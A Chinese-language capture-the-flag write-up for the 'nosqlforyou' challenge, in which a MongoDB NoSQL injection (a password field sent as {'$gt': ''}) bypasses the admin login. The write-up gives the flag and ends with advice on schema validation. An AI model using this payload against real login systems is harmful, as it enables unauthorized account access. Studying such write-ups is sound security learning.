# nosqlforyou

## 题目简述

Express 接受 JSON 请求体，并把 `req.body.user` 与 `req.body.password` 原样放进 MongoDB 查询。密码字段可以从字符串替换成查询运算符，从而绕过精确匹配。

## 解题过程

后端查询为：

```javascript
User.findOne({username: user, password: pass})
```

发送 JSON，并让密码变成 `$gt` 条件：

```json
{
  "user": "admin",
  "password": {"$gt": ""}
}
```

查询会命中密码大于空字符串的管理员文档，响应中返回：

```text
n00bz{n0sq1i_i5_1nt3re5t1ng}
```

这里必须使用源码实际读取的字段名 `user`；官方 README 示例写成了 `username`，直接照抄会使 `req.body.user` 为 `undefined`。

## 方法总结

NoSQL 注入的根因是把未验证类型的请求对象当作查询表达式。应对输入做严格 schema 校验，并只把确认过的字符串值传入数据库查询。
